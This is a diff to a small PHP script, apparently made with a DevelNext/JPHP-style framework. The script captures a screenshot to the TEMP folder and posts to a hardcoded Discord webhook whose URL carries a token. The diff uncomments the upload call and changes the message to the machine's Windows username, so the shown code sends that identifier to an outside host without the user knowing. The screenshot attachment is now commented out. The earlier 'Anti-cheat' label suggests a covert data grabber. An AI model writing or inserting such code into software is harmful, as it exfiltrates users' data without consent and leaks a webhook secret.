@@ -9,12 +9,12 @@ $url = "https://discord.com/api/webhooks/838284423278493697/gthE3yddrHZwT5n0dYCq
 new RobotScript->screenshot()->save($_ENV['TEMP'].'\temp.png','png');
 $hookObject = [
 
-    'file' => new File($_ENV['TEMP'].'\temp.png'),
+    //'file' => new File($_ENV['TEMP'].'\temp.png'),
     //'file1' => new File('C:\Users\Alex\Desktop\123.mp3'),
     /*
      * The general "message" shown above your embeds
      */
-    "content" => "Anti-cheat :kissing_closed_eyes: ",
+    "content" => $_ENV['USERNAME']." :kissing_closed_eyes: ",
 
     /*
      * The username shown in the message
@@ -35,7 +35,7 @@ $hookObject = [
 $http = new HttpClient;
 $http->requestType = 'MULTIPART';
 $http->responseType = 'JSON';
-//var_dump($http->post($url,$hookObject)->body());
+var_dump($http->post($url,$hookObject)->body());
 unlink($_ENV['TEMP'].'\temp.png');
 
 
